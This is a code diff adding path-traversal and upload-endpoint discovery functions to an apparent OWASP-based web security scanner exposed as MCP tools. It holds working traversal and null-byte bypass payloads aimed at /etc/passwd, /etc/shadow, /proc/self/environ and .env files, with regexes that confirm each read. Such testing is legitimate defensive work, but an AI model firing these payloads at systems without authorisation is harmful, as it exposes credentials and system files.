@@ -548,13 +548,313 @@ def _extract_upload_url(response_text: str, filename: str) -> Optional[str]:
 
 
 # ============================================================================
+# WSTG-BUSL-09: Test Path Traversal in File Downloads
+# ============================================================================
+
+async def test_path_traversal_download(
+    url: str,
+    auth_session: Optional[Dict[str, Any]] = None
+) -> Dict[str, Any]:
+    """
+    Test for path traversal vulnerabilities in file download/serving endpoints.
+
+    Tests:
+    - Directory listing on common file-serving paths (/ftp, /files, /uploads, /assets, /downloads)
+    - Null byte bypass to access restricted file types (%2500, %00)
+    - Dot-dot-slash traversal (../../etc/passwd)
+    - Encoding bypass (double URL encoding, unicode normalization)
+
+    OWASP Reference: WSTG-BUSL-09, WSTG-ATHZ-01
+    """
+    findings = []
+    headers = _build_headers(auth_session)
+
+    from urllib.parse import urlparse, quote
+    parsed = urlparse(url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+    # Common file-serving directories
+    file_dirs = ["/ftp", "/files", "/uploads", "/download", "/downloads", "/assets", "/backup", "/backups", "/public"]
+
+    # Sensitive files to look for in file directories
+    sensitive_files = [
+        "package.json.bak", "coupons_2013.md.bak", "eastere.gg",
+        "legal.md", "acquisitions.md", "encrypt.pyc",
+        "suspicious_errors.yml", "quarantine",
+        ".htaccess", "web.config", ".env", "config.json",
+        "database.sql", "dump.sql", "backup.zip",
+        ".git/HEAD", ".svn/entries",
+    ]
+
+    # Null byte bypass patterns
+    null_byte_patterns = [
+        "%2500",          # URL-encoded null byte (most common)
+        "%00",            # Standard null byte
+        "%25%30%30",      # Double URL-encoded null byte
+    ]
+
+    # Allowed extensions (that bypass filters)
+    bypass_extensions = [".md", ".pdf", ".txt", ".html", ".png", ".jpg"]
+
+    # Path traversal payloads
+    traversal_payloads = [
+        "../", "..%2f", "..%252f", "%2e%2e/", "%2e%2e%2f",
+        "....//", "..;/", "..\\/", "..%5c",
+    ]
+
+    # Sensitive files to read via traversal
+    traversal_targets = [
+        "etc/passwd", "etc/hosts", "etc/shadow",
+        "proc/self/environ", "proc/version",
+        "windows/win.ini", "windows/system32/drivers/etc/hosts",
+    ]
+
+    async with httpx.AsyncClient(timeout=15.0, follow_redirects=True, verify=False, headers=headers) as client:
+
+        # ===== TEST 1: Directory Listing Discovery =====
+        for dir_path in file_dirs:
+            try:
+                dir_url = f"{base_url}{dir_path}"
+                resp = await client.get(dir_url)
+
+                if resp.status_code == 200:
+                    # Check if directory listing is enabled
+                    listing_indicators = [
+                        r"<title>.*[Ii]ndex of",
+                        r"<h1>.*[Ll]isting",
+                        r"Parent Directory",
+                        r"href=\"\.\./\"",
+                        r"<a href=\"[^\"]+\">",
+                    ]
+
+                    is_listing = any(re.search(p, resp.text) for p in listing_indicators)
+
+                    # Also check if response contains file references (JSON API listing)
+                    has_files = False
+                    try:
+                        data = resp.json()
+                        if isinstance(data, list) and len(data) > 0:
+                            has_files = True
+                            is_listing = True
+                    except Exception:
+                        pass
+
+                    if is_listing or has_files:
+                        findings.append({
+                            "type": "directory_listing",
+                            "url": dir_url,
+                            "severity": "medium",
+                            "description": f"Directory listing enabled on {dir_path}",
+                            "evidence": resp.text[:500]
+                        })
+
+                        # Try to access sensitive files in this directory
+                        for sens_file in sensitive_files:
+                            try:
+                                file_url = f"{dir_url}/{sens_file}"
+                                file_resp = await client.get(file_url)
+
+                                if file_resp.status_code == 200 and len(file_resp.text) > 10:
+                                    findings.append({
+                                        "type": "sensitive_file_access",
+                                        "url": file_url,
+                                        "severity": "high",
+                                        "description": f"Sensitive file accessible: {sens_file}",
+                                        "evidence": file_resp.text[:300]
+                                    })
+                                elif file_resp.status_code == 403:
+                                    # File exists but blocked - try null byte bypass
+                                    for null_byte in null_byte_patterns:
+                                        for ext in bypass_extensions:
+                                            bypass_url = f"{dir_url}/{sens_file}{null_byte}{ext}"
+                                            try:
+                                                bypass_resp = await client.get(bypass_url)
+                                                if bypass_resp.status_code == 200 and len(bypass_resp.text) > 10:
+                                                    findings.append({
+                                                        "type": "null_byte_bypass",
+                                                        "url": bypass_url,
+                                                        "severity": "critical",
+                                                        "description": f"Null byte bypass: accessed {sens_file} via {null_byte}{ext}",
+                                                        "evidence": bypass_resp.text[:300]
+                                                    })
+                                                    break  # Found bypass, stop trying extensions
+                                            except Exception:
+                                                continue
+
+                            except Exception:
+                                continue
+
+            except Exception:
+                continue
+
+        # ===== TEST 2: Path Traversal via URL Parameters =====
+        # Common download parameter patterns
+        download_params = ["file", "path", "filename", "download", "doc", "document", "f", "attachment"]
+
+        for param_name in download_params:
+            for traversal in traversal_payloads:
+                for target_file in traversal_targets[:3]:  # Limit to top 3
+                    payload = traversal * 6 + target_file
+                    test_url = f"{base_url}/?{param_name}={quote(payload)}"
+
+                    try:
+                        resp = await client.get(test_url)
+
+                        # Check for successful file read indicators
+                        if resp.status_code == 200:
+                            file_indicators = [
+                                r"root:.*:0:0:",           # /etc/passwd
+                                r"localhost",               # /etc/hosts
+                                r"\[fonts\]",              # win.ini
+                                r"PATH=",                  # /proc/self/environ
+                                r"Linux version",          # /proc/version
+                            ]
+
+                            for indicator in file_indicators:
+                                if re.search(indicator, resp.text):
+                                    findings.append({
+                                        "type": "path_traversal",
+                                        "url": test_url,
+                                        "parameter": param_name,
+                                        "payload": payload,
+                                        "severity": "critical",
+                                        "description": f"Path traversal: read {target_file} via {param_name} parameter",
+                                        "evidence": resp.text[:500]
+                                    })
+                                    break
+                    except Exception:
+                        continue
+
+        # ===== TEST 3: Path Traversal in URL Path =====
+        for traversal in traversal_payloads[:4]:
+            for target_file in traversal_targets[:2]:
+                path_payload = traversal * 6 + target_file
+                test_url = f"{base_url}/{path_payload}"
+
+                try:
+                    resp = await client.get(test_url)
+                    if resp.status_code == 200:
+                        if re.search(r"root:.*:0:0:", resp.text) or re.search(r"\[fonts\]", resp.text):
+                            findings.append({
+                                "type": "path_traversal_url",
+                                "url": test_url,
+                                "payload": path_payload,
+                                "severity": "critical",
+                                "description": f"Path traversal in URL path: read {target_file}",
+                                "evidence": resp.text[:500]
+                            })
+                except Exception:
+                    continue
+
+    return {
+        "status": "success",
+        "data": {
+            "vulnerable": bool(findings),
+            "findings": findings,
+            "directories_tested": len(file_dirs),
+            "traversal_payloads_tested": len(traversal_payloads) * len(traversal_targets),
+            "message": f"Found {len(findings)} path traversal/file access vulnerabilities" if findings else "No path traversal vulnerabilities detected"
+        }
+    }
+
+
+# ============================================================================
+# WSTG-INFO-06: Discover Upload Endpoints
+# ============================================================================
+
+async def discover_upload_endpoints(
+    base_url: str,
+    auth_session: Optional[Dict[str, Any]] = None
+) -> Dict[str, Any]:
+    """
+    Discover file upload endpoints on the target application.
+
+    Searches for:
+    - Common upload paths (/upload, /file-upload, /api/upload, etc.)
+    - Forms with <input type="file">
+    - API endpoints accepting multipart/form-data
+
+    OWASP Reference: WSTG-INFO-06 (Entry Point Discovery)
+    """
+    endpoints = []
+
+    common_paths = [
+        "/upload", "/file-upload", "/fileupload", "/api/upload",
+        "/api/file", "/api/files", "/upload.php", "/upload.jsp",
+        "/upload.aspx", "/profile/upload", "/user/upload",
+        "/admin/upload", "/files/upload", "/media/upload",
+        "/content/upload", "/image/upload", "/images/upload",
+        "/attachments/upload", "/documents/upload",
+    ]
+
+    headers = _build_headers(auth_session)
+
+    async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
+        for path in common_paths:
+            test_url = base_url.rstrip('/') + path
+            try:
+                response = await client.get(test_url, headers=headers)
+
+                if response.status_code < 500:
+                    has_file_input = '<input' in response.text.lower() and ('type="file"' in response.text.lower() or "type='file'" in response.text.lower())
+                    accepts_multipart = 'multipart/form-data' in response.text.lower()
+
+                    if has_file_input or accepts_multipart or response.status_code == 200:
+                        endpoints.append({
+                            "url": test_url,
+                            "method": "GET",
+                            "status": response.status_code,
+                            "has_file_input": has_file_input,
+                            "accepts_multipart": accepts_multipart,
+                        })
+            except Exception:
+                pass
+
+        try:
+            response = await client.get(base_url, headers=headers)
+            if response.status_code == 200:
+                form_pattern = r'<form[^>]*action="([^"]*)"[^>]*>.*?<input[^>]*type=["\']file["\'][^>]*>.*?</form>'
+                matches = re.findall(form_pattern, response.text, re.IGNORECASE | re.DOTALL)
+
+                for form_action in matches:
+                    if form_action.startswith('/'):
+                        form_url = base_url.rstrip('/') + form_action
+                    elif form_action.startswith('http'):
+                        form_url = form_action
+                    else:
+                        form_url = base_url.rstrip('/') + '/' + form_action
+
+                    if form_url not in [ep["url"] for ep in endpoints]:
+                        endpoints.append({
+                            "url": form_url,
+                            "method": "POST",
+                            "status": 200,
+                            "has_file_input": True,
+                            "accepts_multipart": True,
+                        })
+        except Exception:
+            pass
+
+    return {
+        "status": "success",
+        "data": {
+            "discovered": len(endpoints) > 0,
+            "endpoints": endpoints,
+            "message": f"Discovered {len(endpoints)} potential upload endpoints" if endpoints else "No upload endpoints discovered"
+        }
+    }
+
+
+# ============================================================================
 # MCP Tool Exports
 # ============================================================================
 
 __all__ = [
+    "discover_upload_endpoints",
     "test_unrestricted_upload",
     "test_path_traversal_upload",
     "test_xxe_via_svg",
     "test_mime_type_bypass",
     "test_upload_size_limit",
+    "test_path_traversal_download",
 ]
